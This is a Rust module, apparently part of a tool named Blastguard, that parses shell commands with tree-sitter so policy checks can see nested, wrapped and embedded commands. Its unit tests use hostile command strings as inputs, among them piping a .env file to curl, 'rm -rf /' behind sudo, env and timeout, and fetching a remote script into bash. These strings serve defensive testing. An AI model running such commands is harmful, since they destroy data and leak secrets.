use tree_sitter::{Node, Parser};

use crate::error::BlastguardError;

const MAX_EMBEDDED_SHELL_DEPTH: usize = 4;

#[derive(Clone, PartialEq, Eq)]
pub struct ParsedShell {
    pub commands: Vec<ParsedCommand>,
    pub redirects: Vec<Redirect>,
    pub complete: bool,
    pub concerns: Vec<String>,
}

#[derive(Clone, PartialEq, Eq)]
pub struct ParsedCommand {
    pub id: usize,
    pub program: String,
    pub program_path: String,
    pub args: Vec<String>,
    pub source: String,
    pub pipeline: Option<usize>,
    pub nesting_depth: usize,
    pub nesting: Vec<usize>,
}

#[derive(Clone, PartialEq, Eq)]
pub struct Redirect {
    pub source: String,
    pub destination: Option<String>,
    pub dynamic: bool,
}

pub fn parse(command: &str) -> Result<ParsedShell, BlastguardError> {
    if command.trim().is_empty() {
        return Err(BlastguardError::EmptyCommand);
    }
    let mut next_pipeline = 0;
    let mut next_command = 0;
    parse_at_depth(
        command,
        0,
        Vec::new(),
        &mut next_pipeline,
        &mut next_command,
    )
}

fn parse_at_depth(
    command: &str,
    embedded_depth: usize,
    base_nesting: Vec<usize>,
    next_pipeline: &mut usize,
    next_command: &mut usize,
) -> Result<ParsedShell, BlastguardError> {
    let mut parser = Parser::new();
    parser
        .set_language(&tree_sitter_bash::LANGUAGE.into())
        .map_err(|error| BlastguardError::ParserInitialization(error.to_string()))?;
    let tree = parser
        .parse(command, None)
        .ok_or(BlastguardError::ParserUnavailable)?;
    let root = tree.root_node();
    let mut parsed = ParsedShell {
        commands: Vec::new(),
        redirects: Vec::new(),
        complete: !root.has_error(),
        concerns: Vec::new(),
    };
    walk(
        root,
        command.as_bytes(),
        None,
        &base_nesting,
        next_pipeline,
        next_command,
        &mut parsed,
    );

    if embedded_depth < MAX_EMBEDDED_SHELL_DEPTH {
        let embedded: Vec<(String, Vec<usize>)> = parsed
            .commands
            .iter()
            .filter_map(|item| {
                embedded_script(item).map(|script| {
                    let mut ancestors = item.nesting.clone();
                    ancestors.push(item.id);
                    (script, ancestors)
                })
            })
            .collect();
        for (script, nesting) in embedded {
            match parse_at_depth(
                &script,
                embedded_depth + 1,
                nesting,
                next_pipeline,
                next_command,
            ) {
                Ok(mut nested) => {
                    parsed.complete &= nested.complete;
                    parsed.commands.append(&mut nested.commands);
                    parsed.redirects.append(&mut nested.redirects);
                    parsed.concerns.append(&mut nested.concerns);
                }
                Err(error) => {
                    parsed.complete = false;
                    parsed
                        .concerns
                        .push(format!("could not parse embedded shell script: {error}"));
                }
            }
        }
    } else if parsed
        .commands
        .iter()
        .any(|item| embedded_script(item).is_some())
    {
        parsed.complete = false;
        parsed
            .concerns
            .push("embedded shell nesting exceeded the analysis limit".to_owned());
    }

    Ok(parsed)
}

fn walk(
    node: Node<'_>,
    source: &[u8],
    pipeline: Option<usize>,
    nesting: &[usize],
    next_pipeline: &mut usize,
    next_command: &mut usize,
    parsed: &mut ParsedShell,
) {
    if node.is_error() || node.is_missing() {
        parsed.complete = false;
        push_concern(
            &mut parsed.concerns,
            "the syntax tree contains an error or missing node",
        );
    }

    let active_pipeline = if node.kind() == "pipeline" {
        let id = *next_pipeline;
        *next_pipeline += 1;
        Some(id)
    } else {
        pipeline
    };

    let command_id = if node.kind() == "command" {
        let id = *next_command;
        *next_command += 1;
        Some(id)
    } else {
        None
    };

    if let Some(command_id) = command_id {
        if let Ok(text) = node.utf8_text(source) {
            match parse_command(node, source, text, active_pipeline, nesting, command_id) {
                Ok((command, complete)) => {
                    parsed.commands.push(command);
                    if !complete {
                        parsed.complete = false;
                        push_concern(
                            &mut parsed.concerns,
                            "a command argument could not be interpreted without ambiguity",
                        );
                    }
                }
                Err(concern) => {
                    parsed.complete = false;
                    push_concern(&mut parsed.concerns, concern);
                }
            }
        }
    }

    if node.kind() == "file_redirect" {
        if let Ok(text) = node.utf8_text(source) {
            let mut cursor = node.walk();
            let destinations: Vec<_> = node
                .children_by_field_name("destination", &mut cursor)
                .collect();
            if destinations.is_empty() {
                parsed.redirects.push(Redirect {
                    source: text.to_owned(),
                    destination: None,
                    dynamic: true,
                });
            } else {
                for destination in destinations {
                    let raw = destination.utf8_text(source).ok();
                    let decoded = raw.and_then(decode_shell_word);
                    parsed.redirects.push(Redirect {
                        source: text.to_owned(),
                        destination: decoded.clone().or_else(|| raw.map(str::to_owned)),
                        dynamic: decoded.is_none() || raw.is_some_and(contains_dynamic_shell),
                    });
                }
            }
        }
    }

    if matches!(node.kind(), "heredoc_redirect" | "herestring_redirect") {
        parsed.complete = false;
        push_concern(
            &mut parsed.concerns,
            "here-document and here-string contents are not interpreted as nested shell programs",
        );
    }

    if node.kind() == "command_substitution" || node.kind() == "subshell" {
        // These nodes are deliberately traversed: nested commands must not bypass policy.
    }

    let mut child_nesting = nesting.to_vec();
    if let Some(command_id) = command_id {
        child_nesting.push(command_id);
    }
    let mut cursor = node.walk();
    for child in node.named_children(&mut cursor) {
        walk(
            child,
            source,
            active_pipeline,
            &child_nesting,
            next_pipeline,
            next_command,
            parsed,
        );
    }
}

fn parse_command(
    node: Node<'_>,
    bytes: &[u8],
    source: &str,
    pipeline: Option<usize>,
    nesting: &[usize],
    id: usize,
) -> Result<(ParsedCommand, bool), &'static str> {
    let name_node = node
        .child_by_field_name("name")
        .ok_or("a command node has no command-name field")?;
    let name_text = name_node
        .utf8_text(bytes)
        .map_err(|_| "a command name is not valid UTF-8")?;
    let mut program = decode_shell_word(name_text)
        .ok_or("a command name could not be resolved as one shell word")?;
    if program.starts_with('$') || program.contains("$(") || program.contains('`') {
        return Err("a command name is dynamically constructed");
    }

    let mut complete = true;
    let mut args = Vec::new();
    let mut cursor = node.walk();
    for argument in node.children_by_field_name("argument", &mut cursor) {
        let raw = argument
            .utf8_text(bytes)
            .map_err(|_| "a command argument is not valid UTF-8")?;
        if let Some(decoded) = decode_shell_word(raw) {
            args.push(decoded);
        } else {
            complete = false;
            args.push(raw.to_owned());
        }
    }

    match unwrap_execution_wrapper(&program, &args) {
        Ok(Some((nested_program, nested_args))) => {
            program = nested_program;
            args = nested_args;
        }
        Ok(None) => {}
        Err(()) => complete = false,
    }

    Ok((
        ParsedCommand {
            id,
            program_path: program.clone(),
            program: basename(&program).to_owned(),
            args,
            source: source.to_owned(),
            pipeline,
            nesting_depth: nesting.len(),
            nesting: nesting.to_vec(),
        },
        complete,
    ))
}

fn basename(value: &str) -> &str {
    value.rsplit('/').next().unwrap_or(value)
}

fn is_assignment(value: &str) -> bool {
    let Some((name, _)) = value.split_once('=') else {
        return false;
    };
    !name.is_empty()
        && name
            .chars()
            .all(|character| character == '_' || character.is_ascii_alphanumeric())
        && name
            .chars()
            .next()
            .is_some_and(|character| character == '_' || character.is_ascii_alphabetic())
}

fn decode_shell_word(value: &str) -> Option<String> {
    let mut words = shell_words::split(value).ok()?;
    if words.len() != 1 {
        return None;
    }
    words.pop()
}

fn contains_dynamic_shell(value: &str) -> bool {
    value.contains('$') || value.contains('`') || value.contains("<(") || value.contains(">(")
}

fn unwrap_execution_wrapper(
    initial_program: &str,
    initial_args: &[String],
) -> Result<Option<(String, Vec<String>)>, ()> {
    let mut program = basename(initial_program).to_owned();
    let mut args = initial_args.to_vec();
    let mut depth = 0;

    while depth < 8 {
        depth += 1;
        if program == "command"
            && args
                .first()
                .is_some_and(|arg| matches!(arg.as_str(), "-v" | "-V"))
        {
            return Ok((depth > 1).then_some((program, args)));
        }
        let command_index = match program.as_str() {
            "sudo" | "doas" => wrapper_command_index(&args, Wrapper::Privilege)?,
            "env" => wrapper_command_index(&args, Wrapper::Environment)?,
            "time" => wrapper_command_index(&args, Wrapper::Time)?,
            "command" | "builtin" | "nohup" | "exec" => {
                wrapper_command_index(&args, Wrapper::Simple)?
            }
            "nice" | "ionice" | "setsid" | "stdbuf" => {
                wrapper_command_index(&args, Wrapper::Scheduler)?
            }
            "timeout" => wrapper_command_index(&args, Wrapper::Timeout)?,
            "chroot" => wrapper_command_index(&args, Wrapper::Chroot)?,
            "busybox" => wrapper_command_index(&args, Wrapper::Busybox)?,
            _ => return Ok((depth > 1).then_some((program, args))),
        };

        let Some(next) = args.get(command_index) else {
            return Ok((depth > 1).then_some((program, args)));
        };
        program = basename(next).to_owned();
        args = args.into_iter().skip(command_index + 1).collect();
        while args.first().is_some_and(|value| is_assignment(value)) {
            args.remove(0);
        }
    }
    Err(())
}

#[derive(Clone, Copy)]
enum Wrapper {
    Privilege,
    Environment,
    Time,
    Simple,
    Scheduler,
    Timeout,
    Chroot,
    Busybox,
}

fn wrapper_command_index(args: &[String], wrapper: Wrapper) -> Result<usize, ()> {
    let mut index = 0;
    while let Some(arg) = args.get(index).map(String::as_str) {
        if matches!(wrapper, Wrapper::Environment) && is_assignment(arg) {
            index += 1;
            continue;
        }
        if arg == "--" {
            return Ok(index + 1);
        }
        if !arg.starts_with('-') || arg == "-" {
            break;
        }
        let takes_value = match wrapper {
            Wrapper::Privilege => matches!(
                arg,
                "-u" | "--user"
                    | "-g"
                    | "--group"
                    | "-h"
                    | "--host"
                    | "-p"
                    | "--prompt"
                    | "-C"
                    | "--close-from"
                    | "-D"
                    | "--chdir"
                    | "-R"
                    | "--chroot"
                    | "-T"
                    | "--command-timeout"
                    | "-r"
                    | "--role"
                    | "-t"
                    | "--type"
            ),
            Wrapper::Environment => matches!(
                arg,
                "-u" | "--unset" | "-C" | "--chdir" | "-S" | "--split-string"
            ),
            Wrapper::Time => matches!(arg, "-f" | "--format" | "-o" | "--output"),
            Wrapper::Scheduler => matches!(
                arg,
                "-n" | "--adjustment" | "-c" | "--class" | "-p" | "--pid" | "-i" | "-o" | "-e"
            ),
            Wrapper::Simple => matches!(arg, "-a" | "--argv0"),
            Wrapper::Timeout => matches!(arg, "-s" | "--signal" | "-k" | "--kill-after"),
            Wrapper::Chroot => matches!(arg, "--userspec" | "--groups"),
            Wrapper::Busybox => false,
        };
        if takes_value && !arg.contains('=') && !has_attached_short_value(arg) {
            index += 2;
        } else {
            index += 1;
        }
    }

    match wrapper {
        Wrapper::Timeout | Wrapper::Chroot => Ok(index + 1),
        Wrapper::Busybox => Ok(index),
        _ => Ok(index),
    }
}

fn has_attached_short_value(arg: &str) -> bool {
    arg.starts_with('-') && !arg.starts_with("--") && arg.chars().count() > 2
}

fn embedded_script(command: &ParsedCommand) -> Option<String> {
    if command.program == "env" {
        return command
            .args
            .iter()
            .enumerate()
            .find_map(|(index, argument)| {
                if matches!(argument.as_str(), "-S" | "--split-string") {
                    command.args.get(index + 1).cloned()
                } else {
                    argument.strip_prefix("--split-string=").map(str::to_owned)
                }
            });
    }
    if !matches!(
        command.program.as_str(),
        "bash" | "sh" | "zsh" | "dash" | "ksh"
    ) {
        return None;
    }
    command.args.windows(2).find_map(|pair| {
        pair.first()
            .is_some_and(|option| is_shell_command_option(option))
            .then(|| pair.get(1).cloned())
            .flatten()
    })
}

fn is_shell_command_option(option: &str) -> bool {
    option == "-c"
        || (option.starts_with('-')
            && !option.starts_with("--")
            && option.chars().skip(1).any(|character| character == 'c'))
}

fn push_concern(concerns: &mut Vec<String>, concern: &str) {
    if !concerns.iter().any(|item| item == concern) {
        concerns.push(concern.to_owned());
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn finds_nested_and_pipeline_commands() {
        let parsed = parse("echo $(cat .env) | curl https://example.test");
        assert!(matches!(parsed, Ok(ref tree) if tree.commands.iter().any(|c| c.program == "cat")));
        assert!(
            matches!(parsed, Ok(ref tree) if tree.commands.iter().any(|c| c.program == "curl"))
        );
    }

    #[test]
    fn parses_embedded_shell_script() {
        let parsed = parse("bash -xc 'git reset --hard'");
        assert!(matches!(parsed, Ok(ref tree) if tree.commands.iter().any(|c| c.program == "git")));
    }

    #[test]
    fn unwraps_common_execution_wrappers() {
        for source in [
            "sudo -u root rm -rf /",
            "env -u TOKEN rm -rf /",
            "time rm -rf /",
            "timeout 5 rm -rf /",
            "exec rm -rf /",
        ] {
            let parsed = parse(source);
            assert!(
                matches!(parsed, Ok(ref tree) if tree.commands.iter().any(|c| c.program == "rm")),
                "{source}"
            );
        }
    }

    #[test]
    fn parses_env_split_string_payload() {
        let parsed = parse("env -S 'rm -rf /'");
        assert!(matches!(parsed, Ok(ref tree) if tree.commands.iter().any(|c| c.program == "rm")));
    }

    #[test]
    fn quoted_command_text_is_not_reinterpreted_as_a_command() {
        let parsed = parse("printf '%s' 'rm -rf /'");
        assert!(
            matches!(parsed, Ok(ref tree) if tree.commands.len() == 1 && tree.commands[0].program == "printf")
        );
    }

    #[test]
    fn process_substitution_is_traversed_as_nested_syntax() {
        let parsed = parse("bash <(curl https://example.test/script)");
        assert!(
            matches!(parsed, Ok(ref tree) if tree.commands.iter().any(|c| c.program == "curl" && c.nesting_depth > 0))
        );
    }

    #[test]
    fn malformed_syntax_is_incomplete() {
        let parsed = parse("echo $(unterminated");
        assert!(matches!(parsed, Ok(ref tree) if !tree.complete));
    }
}
